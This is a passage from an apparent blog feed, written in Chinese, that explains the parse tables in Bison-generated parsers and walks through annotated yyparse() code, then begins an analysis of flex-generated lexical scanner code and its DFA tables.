class="line">&#125;;</span><br></pre></td></tr></table></figure><p>yyr2表示每个rule右部的symbol数量，</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYR2[YYN] -- Number of symbols composing right hand side of rule YYN.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yyr2[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">0</span>,     <span class="number">2</span>,     <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>例如<strong>rule2</strong>的<code>S: &#39;\n&#39;</code>右侧有1个symbol，因此yyr2[2]=1。在归约的时候，通过这个表中查找在对应的rule下，我们要从栈中pop出多少state来作为归约。</p><h4 id="yytable"><a href="#yytable" class="headerlink" title="yytable"></a>yytable</h4><p>yytable和yycheck, yypact, yypgoto 配合来表示当前的状态是应该放入移入中还是符合rule来进行归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYTABLE[YYPACT[STATE-NUM]].  What to do in state STATE-NUM.  If</span></span><br><span class="line"><span class="comment">   positive, shift that token.  If negative, reduce the rule which</span></span><br><span class="line"><span class="comment">   number is the opposite.  If zero, do what YYDEFACT says.</span></span><br><span class="line"><span class="comment">   If YYTABLE_NINF, syntax error.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYTABLE_NINF -1</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_uint8 yytable[] =</span><br><span class="line">&#123;</span><br><span class="line">       <span class="number">1</span>,     <span class="number">3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正数表示移入，负数表示归约，其中归约所使用的规则的number为元素的绝对值，即如果是-3，则使用rule3来进行归约。</p><h4 id="yypgoto"><a href="#yypgoto" class="headerlink" title="yypgoto"></a>yypgoto</h4><p>因为同一个非终结符，根据之前状态的不同，其跳转的状态也是不同的，那么对于存在不同情况的GOTO情况，则由yypgoto记录。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* YYPGOTO[NTERM-NUM].  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypgoto[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-4</span>,     <span class="number">-4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>此表的索引对应这所有的非终结符，这里分别对应<code>$accept</code>,<code>S</code>。</p><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引，去yytable找到新的状态值，即此时状态索引为0 (4-4)， 那么yytable[0]为1，那么现在的状态就是1，被压入状态栈顶。</p><p>parser到底是用<code>yypgoto</code>还是<code>yydefgoto</code>来设置接下来的状态，将在<code>yycheck</code>中指出。</p><h4 id="yypact"><a href="#yypact" class="headerlink" title="yypact"></a>yypact</h4><p>yypact定义了在初始状态下的部分yytable。它由token标号来索引。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYPACT_NINF -4</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> yytype_int8 yypact[] =</span><br><span class="line">&#123;</span><br><span class="line">      <span class="number">-3</span>,    <span class="number">-4</span>,    <span class="number">1</span>,     <span class="number">-4</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这是解析循环查询的第一个表，在parse循环开始的时候，如果yypact[cur-state] = YYPACT_NINF，意味着使用yydefact来进行归约，并且只有归约没有移入操作。</p><p>例如此处如果是状态1和3，则为YYPACT_NINF，只进行归约操作。</p><p>如果现在在状态0，展望符为<code>\n</code>(即3号symbol,由yytranslate可得)，那么现在的yypact[0]为-3，所以在yytable中的索引应该为<code>-3+3=0</code>, yytable[0]为1，表示移入并转移到状态1。</p><h4 id="yycheck"><a href="#yycheck" class="headerlink" title="yycheck"></a>yycheck</h4><p>yycheck主要有两个作用，一个是判断归约还是移入，一个是判断选用<code>yypgoto</code>还是<code>yydefgoto</code>跳转表。</p><h5 id="yytable-or-yydefact"><a href="#yytable-or-yydefact" class="headerlink" title="yytable or yydefact"></a>yytable or yydefact</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">YYCHECK = a <span class="built_in">vector</span> indexed in parallel with YYTABLE.  It indicates,</span><br><span class="line">   in a roundabout way, the bounds of the portion you are trying to</span><br><span class="line">   examine.</span><br><span class="line"></span><br><span class="line">   Suppose that the portion of YYTABLE starts at index P <span class="keyword">and</span> the index</span><br><span class="line">   to be examined within the portion is I.  Then <span class="keyword">if</span> YYCHECK[P+I] != I,</span><br><span class="line">   I is outside the bounds of what is actually allocated, <span class="keyword">and</span> the</span><br><span class="line">   <span class="keyword">default</span> (from YYDEFACT <span class="keyword">or</span> YYDEFGOTO) should be used.  Otherwise,</span><br><span class="line">   YYTABLE[P+I] should be used.</span><br></pre></td></tr></table></figure><p>parse会判断yycheck[0]是否为所有有效token的symbol number, 如果不是，则进行yydefault的归约。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn += yytoken;</span><br><span class="line">  <span class="keyword">if</span> (yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn || yycheck[yyn] != yytoken)</span><br><span class="line">    <span class="keyword">goto</span> yydefault;</span><br></pre></td></tr></table></figure><p>此时yycheck[0]=3，而<code>\n</code>正好是3号symbol，所有我们选择<code>yytable</code>。</p><h5 id="yydefgoto-or-yypgoto"><a href="#yydefgoto-or-yypgoto" class="headerlink" title="yydefgoto or yypgoto"></a>yydefgoto or yypgoto</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">yyn = yyr1[yyn];</span><br><span class="line">yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] == *yyssp)</span><br><span class="line">    yystate = yytable[yystate];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    yystate = yydefgoto[yyn - YYNTOKENS];</span><br></pre></td></tr></table></figure><p>比如现在在rule2 (<code>S -&gt; &#39;\n&#39;</code>)归约后，栈顶的状态为4，parser会将yypgoto[S]的值(此处yypgoto[1]=-4)加上原先的状态值作为现在的状态索引4-4=0，查询yycheck，如果为4，则表示状态4为特殊状态，选择yytable; 否则就用yydefgoto表来决定跳转。</p><h3 id="parse分析"><a href="#parse分析" class="headerlink" title="parse分析"></a>parse分析</h3><p>详见注释</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 此变量存储展望符.  */</span></span><br><span class="line"><span class="keyword">int</span> yychar;</span><br><span class="line"><span class="comment">/* 展望符的语义值.  */</span></span><br><span class="line">YYSTYPE yylval;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> </span><br><span class="line">yyparse()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> yystate; <span class="comment">/* current state */</span></span><br><span class="line"><span class="keyword">int</span> yyn;<span class="comment">/* 这是一个通用变量！一次可能代表一种状态，下次可能代表一条规则 */</span></span><br><span class="line"><span class="keyword">int</span> yyresult;<span class="comment">/* 解析结果返回给调用者 */</span></span><br><span class="line"><span class="keyword">int</span> yytoken=<span class="number">0</span>;<span class="comment">/* current token */</span></span><br><span class="line"><span class="comment">/* The state stack: This parser does not shift symbols on to the stack. Only a stack of states is maintained. */</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">int</span> yyssa[YYINITDEPTH];<span class="comment">/*YYINITDEPTH is 200 */</span></span><br><span class="line"> <span class="keyword">int</span> *yyss = yyssa<span class="comment">/* Bottom of state stack */</span></span><br><span class="line"> <span class="keyword">int</span> *yyssp;<span class="comment">/* Top of state stack */</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The semantic value stack: 该栈与状态栈平行增长。每次减少时，都会从堆栈中弹出语义值，并执行语义操作 */</span></span><br><span class="line">  YYSTYPE yyvsa[YYINITDEPTH];</span><br><span class="line">  YYSTYPE *yyvs = yyvsa;<span class="comment">/* Bottom of semantic stack */</span></span><br><span class="line">  YYSTYPE *yyvsp;<span class="comment">/* Top of semantic stack */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POP the state and semantic stacks by N symbols - useful for reduce actions */</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">define</span> YYPOPSTACK(N)   (yyvsp -= (N), yyssp -= (N))</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">int</span> yylen = <span class="number">0</span>;<span class="comment">/* 该变量用于归约操作中保存规则右侧的终结符长度 */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok done declaring variables. Set the ball rolling */</span></span><br><span class="line">  </span><br><span class="line">  yystate = <span class="number">0</span>;<span class="comment">/* Initial state */</span></span><br><span class="line">  yychar = YYEMPTY <span class="comment">/* YYEMPTY is -2 */</span></span><br><span class="line">  </span><br><span class="line">  yyssp = yyss; <span class="comment">/* Top = bottom for state stack */</span></span><br><span class="line">  yyvsp = yyvs;<span class="comment">/* Same for semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yysetstate; <span class="comment">/* Well, gotos are used for extracting maximum performance. */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Each label can be thought of as a function */</span></span><br><span class="line">  </span><br><span class="line">  yynewstate:  <span class="comment">/* Push a new state on the stack */</span></span><br><span class="line">  </span><br><span class="line">  yyssp ++;<span class="comment">/*Just increment the stack top; actual 'pushing' will happen in yysetstate */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yysetstate:</span><br><span class="line">  </span><br><span class="line">  *yyssp = yystate;<span class="comment">/* Ok pushed state on state stack top */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yybackup;<span class="comment">/* This is where you will find some action */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yybackup:<span class="comment">/* The main parsing code starts here */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yypact[yystate];<span class="comment">/* Refer to what yypact is saying about the current state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == YYPACT_NINF) <span class="comment">/* If negative infinity its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yydefault;<span class="comment">/* This label implements default reductions; see below */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Check if we have a look-ahead token ready. This is LALR(1) parsing */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar == YYEMPTY)</span><br><span class="line">  </span><br><span class="line">  yychar = YYLEX; <span class="comment">/* Macro YYLEX is defined as yylex() */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yychar &lt;= YYEOF) <span class="comment">/* YYEOF is 0 - the token returned by lexer at end of input */</span></span><br><span class="line">  </span><br><span class="line">  yychar = yytoken = YYEOF; <span class="comment">/* set all to EOF */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  </span><br><span class="line">  yytoken = yytranslate[yychar];<span class="comment">/* Translate the lexer token into internal symbol number */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Now we have a look-ahead token. Let the party begin ! */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyn = yyn + yytoken;<span class="comment">/* This is yypact[yystate] + yytoken */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Observe this check carefully. We are checking that yyn is within the bounds of yytable</span></span><br><span class="line"><span class="comment">   * and also if yycheck contains the current token number.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> ( yyn &lt; <span class="number">0</span> || YYLAST &lt; yyn  || yycheck[yyn] != yytoken )<span class="comment">/* YYLAST is the highest index in yytable */</span></span><br><span class="line">     </span><br><span class="line">  <span class="keyword">goto</span> yydefault; <span class="comment">/* Its time for a default reduction */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Ok, yyn is within bounds of yytable */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yytable[yyn];<span class="comment">/* This is yytable[ yypact[yystate] + yytoken ] */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (yyn &lt;= <span class="number">0</span>)<span class="comment">/* If yytable happens to contain a -ve value, its not a shift - its a reduce */</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> (yyn == <span class="number">0</span> || yyn == YYTABLE_NINF)<span class="comment">/* But check for out of bounds condition*/</span></span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;<span class="comment">/* Label to handle errors */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Other wise reduce with rule # -yyn */</span></span><br><span class="line">  </span><br><span class="line">  yyn = -yyn;</span><br><span class="line">  <span class="keyword">goto</span> yyreduce; <span class="comment">/* Label to implement reductions */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Last check: See if we reached final state! */</span></span><br><span class="line">  <span class="keyword">if</span> (yyn == YYFINAL)<span class="comment">/* YYFINAL is 8 in our case */</span></span><br><span class="line">  YYACCEPT;<span class="comment">/* macro deined as 'goto acceptlab - a label to finish up */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* That completes all checks; If we reached here, there is no other option but to shift */</span></span><br><span class="line">  </span><br><span class="line">  yystate = yyn;<span class="comment">/* Now, yyn (= yytable[ yypact[yystate] + yytoken ]) is a state that has to be pushed */</span></span><br><span class="line">  </span><br><span class="line">  *++yyvsp = yylval; <span class="comment">/* Push the semantic value of the symbol on the semantic stack */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yynewstate;<span class="comment">/* This will increment state stack top and the following yysetstate that will do the pushing */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yydefault:<span class="comment">/* A label to implement default reductions */</span></span><br><span class="line">  </span><br><span class="line">  yyn = yydefact[yystate];<span class="comment">/* Get the default reduction rule for this state */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( yyn == <span class="number">0</span> )<span class="comment">/* This state has no default reduction. Something is wrong */</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyerrlab;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">goto</span> yyreduce;<span class="comment">/* Ok, got the default reduction rule # in yyn; go ahead and reduce the stack */</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  yyreduce:<span class="comment">/* A lablel that implements reductions on stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* By the time we are here, yyn contains the rule# to use for reducing the stack. */</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Steps for reduction:</span></span><br><span class="line"><span class="comment">   * 1. Find the length of RHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 2. Execute any semantic actions by taking the values from the semantic stack</span></span><br><span class="line"><span class="comment">   * 3. POP 'length' symbols from the state stack and 'length' values from semantic stack</span></span><br><span class="line"><span class="comment">   * 4. Find the LHS of rule #yyn</span></span><br><span class="line"><span class="comment">   * 5. Find the GOTO of state currently on top of stack on LHS symbol</span></span><br><span class="line"><span class="comment">   * 6. Push that state on top of stack</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">   </span><br><span class="line">   yylen = yyr2[yyn];<span class="comment">/* Get length of RHS */</span></span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Default semantic action - $$=$1 */</span></span><br><span class="line">   yyval = yyvsp[<span class="number">1</span>-yylen];</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Execute semantic actions */</span></span><br><span class="line">   <span class="keyword">switch</span> ( yyn )<span class="comment">/* Each rule has its own semantic action */</span></span><br><span class="line">   &#123;</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">default</span>:<span class="keyword">break</span>;<span class="comment">/* We didn't have any semantic actions in the grammar.*/</span></span><br><span class="line">   </span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   YYPOPSTACK (yylen);<span class="comment">/* This will pop both state and semantic stacks. See definition of this macro above */</span></span><br><span class="line">   </span><br><span class="line">   yylen = <span class="number">0</span>;<span class="comment">/* re-initialize yylen */</span></span><br><span class="line">   </span><br><span class="line">   *++yyvsp  = yyval;<span class="comment">/* Push the result of semantic evaluation on top of semantic stack */</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* Now shift the result of reduction (steps 4 - 6) */</span></span><br><span class="line">   </span><br><span class="line">   yyn = yyr1[yyn];<span class="comment">/* Reuse yyn at every opportunity.  For now, yyn is the LHS symbol (number) of the rule */</span></span><br><span class="line">   </span><br><span class="line"> <span class="comment">/* First check for anomalous GOTOs, otherwise use Default GOTO (YYDEFGOTO)</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Observe that if we subtract no. of terminals (YYNTOKENS) from symbol number of a nonterminal, we get</span></span><br><span class="line"><span class="comment">  * an index into yypgoto or yydefgoto for that non-terminal.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  </span><br><span class="line">   yystate = yypgoto[yyn - YYNTOKENS] + *yyssp;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">/* A couple of checks are needed before we know this is not a default GOTO</span></span><br><span class="line"><span class="comment">    * 1. yystate must be within bounds of yytable. ( 0 to YYLAST )</span></span><br><span class="line"><span class="comment">    * 2. yycheck must contain the state currently on top of the stack</span></span><br><span class="line"><span class="comment">    */</span>   </span><br><span class="line">   <span class="keyword">if</span> ( <span class="number">0</span> &lt;= yystate &amp;&amp; yystate &lt;= YYLAST &amp;&amp; yycheck[yystate] = *yyssp)</span><br><span class="line">   </span><br><span class="line">   yystate = yytable[yystate];<span class="comment">/* Take the GOTO from yytable */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   </span><br><span class="line">   yystate = yydefgoto[yyn - YYNTOKENS];<span class="comment">/* Otherwise use the default GOTO */</span></span><br><span class="line">   </span><br><span class="line">   <span class="keyword">goto</span> yynewstate;<span class="comment">/* Simply push the newly found state on top of stack and continue */</span></span><br><span class="line">   </span><br><span class="line">&#125;<span class="comment">/* End of yyparse() */</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>总的来说和flex类似，其实也是通过一系列的表来驱动。</p><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser" target="_blank" rel="noopener">https://www.cs.uic.edu/~spopuri/cparser.html#lr-parser</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;table分析&quot;&gt;&lt;a href=&quot;#table分析&quot; class=&quot;headerlink&quot; title=&quot;table分析&quot;&gt;&lt;/a&gt;table分析&lt;/h3&gt;&lt;p&gt;bision与flex类似，有一系列的表，理清这些表之间的关系及索引方式后能更好的理解&lt;code&gt;y
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>lexical scanner generated by flex</title>
    <link href="https://billyotry.github.io/2020/06/25/lexical%20scanner%20generated%20by%20flex/"/>
    <id>https://billyotry.github.io/2020/06/25/lexical%20scanner%20generated%20by%20flex/</id>
    <published>2020-06-25T14:46:37.470Z</published>
    <updated>2020-06-28T12:15:09.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flex生成代码分析"><a href="#flex生成代码分析" class="headerlink" title="flex生成代码分析"></a>flex生成代码分析</h2><p>本文从flex源码入手分析flex框架。</p><p>flex会根据我们所定义的正则表达式来匹配相应的字符，然后执行相应的函数操作来输出相应的 token。</p><p>新建空规则 <code>null.flex</code> 来了解 flex 是如何工作的。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%%</span><br></pre></td></tr></table></figure><p>运行命令 <code>flex null.flex</code> 生成代码如下：<a href="https://pastebin.com/LBEXsnZK" target="_blank" rel="noopener">https://pastebin.com/LBEXsnZK</a></p><p>首先定义与 flex 版本相关的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define FLEX_SCANNER</span><br><span class="line">#define YY_FLEX_MAJOR_VERSION 2</span><br><span class="line">#define YY_FLEX_MINOR_VERSION 6</span><br><span class="line">#define YY_FLEX_SUBMINOR_VERSION 0</span><br><span class="line">#if YY_FLEX_SUBMINOR_VERSION &gt; 0</span><br><span class="line">#define FLEX_BETA</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>为了防止类型被用户代码冲突，此处将一些类型 define 成的自己的格式，或许是出于可移植性以及用户可定制性的考虑，flex 将大量关键字 define/typedef 成了自己的特殊关键字，不过从名称上大体都能猜出是什么含义。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;inttypes.h&gt;</span><br><span class="line">typedef int8_t flex_int8_t;</span><br><span class="line">typedef uint8_t flex_uint8_t;</span><br><span class="line">typedef int16_t flex_int16_t;</span><br><span class="line">typedef uint16_t flex_uint16_t;</span><br><span class="line">typedef int32_t flex_int32_t;</span><br><span class="line">typedef uint32_t flex_uint32_t;</span><br><span class="line">#else</span><br><span class="line">typedef signed char flex_int8_t;</span><br><span class="line">typedef short int flex_int16_t;</span><br><span class="line">typedef int flex_int32_t;</span><br><span class="line">typedef unsigned char flex_uint8_t; </span><br><span class="line">typedef unsigned short int flex_uint16_t;</span><br><span class="line">typedef unsigned int flex_uint32_t;</span><br></pre></td></tr></table></figure><p>然后是定义 EOF 的宏</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_NULL 0</span><br></pre></td></tr></table></figure><p>将字符转为对应的 ascii 码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define YY_SC_TO_UI(c) ((unsigned int) (unsigned char) c)</span><br></pre></td></tr></table></figure><p>虽然 DFA 在状态转移的过程中一次前进一个字符，但是为了提高 IO 效率，实际从文件读取的时候一般是批量往缓冲区读入的。如果有需要微调这个读入策略的需求，可以通过定义 <code>YY_INPUT</code> 宏来实现。在默认生成的代码中，这个宏被定义为一段比较复杂的C代码。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line"><span class="keyword">if</span> ( YY_CURRENT_BUFFER_LVALUE-&gt;yy_is_interactive ) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> c = <span class="string">'*'</span>; </span><br><span class="line"><span class="keyword">size_t</span> n; </span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt; max_size &amp;&amp; </span><br><span class="line">     (c = getc( yyin )) != EOF &amp;&amp; c != <span class="string">'\n'</span>; ++n ) </span><br><span class="line">buf[n] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == <span class="string">'\n'</span> ) </span><br><span class="line">buf[n++] = (<span class="keyword">char</span>) c; </span><br><span class="line"><span class="keyword">if</span> ( c == EOF &amp;&amp; ferror( yyin ) ) </span><br><span class="line">YY_FATAL_ERROR( <span class="string">"input in flex scanner failed"</span> ); </span><br><span class="line">result = n; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line"><span class="keyword">while</span> ( (result = fread(buf, <span class="number">1</span>, max_size, yyin))==<span class="number">0</span> &amp;&amp; ferror(yyin)) </span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">if</span>( errno != EINTR) </span><br><span class="line">&#123; </span><br><span class="line">YY_FATAL_ERROR( <span class="string">"input in flex scanner failed"</span> ); </span><br><span class="line"><span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line">errno=<span class="number">0</span>; </span><br><span class="line">clearerr(yyin); </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>上述 C 代码十分复杂，我们也可以将此宏修改成如下形式</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> YY_INPUT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YY_INPUT(buf,result,max_size) </span></span><br><span class="line">    <span class="keyword">if</span> ( (result = fread( (<span class="keyword">char</span>*)buf, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), max_size, fin)) &lt; <span class="number">0</span>) </span><br><span class="line">        YY_FATAL_ERROR( <span class="string">"read() in flex scanner failed"</span>);</span><br></pre></td></tr></table></figure><h2 id="DFA状态转移表分析"><a href="#DFA状态转移表分析" class="headerlink" title="DFA状态转移表分析"></a>DFA状态转移表分析</h2><h3 id="未压缩状态矩阵"><a href="#未压缩状态矩阵" class="headerlink" title="未压缩状态矩阵"></a>未压缩状态矩阵</h3><p>以下是<strong>经过压缩</strong>的状态转移矩阵.其实 flex 在默认的情况下,会输出压缩版本的状态转移矩阵,因为完整版本的矩阵是 Nx128 大小(其中N是自动机的状态数，128 则是字符集大小如果不经压缩的话,会带来不必要的空间开销。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_accept[6]</span><br><span class="line">static yyconst YY_CHAR yy_ec[256]</span><br><span class="line">static yyconst YY_CHAR yy_meta[2]</span><br><span class="line">static yyconst flex_uint16_t yy_base[7]</span><br><span class="line">static yyconst flex_int16_t yy_def[7]</span><br><span class="line">static yyconst flex_uint16_t yy_nxt[5]</span><br><span class="line">static yyconst flex_int16_t yy_chk[5]</span><br></pre></td></tr></table></figure><p>以下是未经过压缩的状态转移矩阵。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static yyconst flex_int16_t yy_nxt[][128] &#x3D; &#123;...&#125;</span><br><span class="line">static yyconst flex_int16_t yy_accept[..] &#x3D; &#123;...&#125;</span><br></pre></td></tr></table></figure><ul><li>yy_accept 是 accept 的状态</li><li>yy_nxt 是状态跳转表</li></ul><p>有了状态转移表，接下来的关键问题就是如何使用它。这里我们就要参考词法分析函数的实现函数—— <code>yylex()</code>的具体实现了。</p><p>在 flex 所生成的代码中，连这个函数的定义语句都被define成<code>YY_DECL</code>：<code>#define YY_DECL int yylex (void)</code></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** The main scanner function which does all the work.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">YY_DECL</span><br><span class="line">&#123;</span><br><span class="line">    yy_state_type yy_current_state;</span><br><span class="line">    <span class="keyword">char</span> *yy_cp, *yy_bp;</span><br><span class="line">    <span class="keyword">int</span> yy_act;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ( !(yy_init) )</span><br><span class="line">        &#123;</span><br><span class="line">        (yy_init) = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! (yy_start) )</span><br><span class="line">            (yy_start) = <span class="number">1</span>; <span class="comment">// 初始状态定义</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 设置文件输入、输出指针 */</span></span><br><span class="line">        <span class="keyword">if</span> ( ! yyin )</span><br><span class="line">            yyin = <span class="built_in">stdin</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ( ! yyout )</span><br><span class="line">            yyout = <span class="built_in">stdout</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* 对非owner的buffer使用stack方式管理*/</span></span><br><span class="line">        <span class="keyword">if</span> ( ! YY_CURRENT_BUFFER ) &#123;</span><br><span class="line">            yyensure_buffer_stack ();</span><br><span class="line">            YY_CURRENT_BUFFER_LVALUE =</span><br><span class="line">                yy_create_buffer(yyin,YY_BUF_SIZE );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        yy_load_buffer_state( );</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )        </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="comment">// 设置各种buffer处的指针，以便在匹配成功时，通过yytext获取对应字符串</span></span><br><span class="line">        <span class="comment">/*此指针指向上一字符*/</span></span><br><span class="line">        yy_cp = (yy_c_buf_p);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* Support of yytext. */</span></span><br><span class="line">        <span class="comment">/*此指针不断指向要读入的字符,将会在状态跳转中不断更新*/</span></span><br><span class="line">        *yy_cp = (yy_hold_char);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* yy_bp points to the position in yy_ch_buf of the start of</span></span><br><span class="line"><span class="comment">         * the current run.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        yy_bp = yy_cp;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 默认从start状态开始</span></span><br><span class="line">        yy_current_state = (yy_start);</span><br><span class="line">yy_match:</span><br><span class="line">        <span class="comment">// 开始进行状态转移, 通过yy_nxt表，结合yy_current_state和当前读入的字符来索引跳转状态, 直到无法转移</span></span><br><span class="line">        <span class="comment">// 根据当前状态，以及下一个字符，来进行转移</span></span><br><span class="line">        <span class="keyword">while</span> ( (yy_current_state = 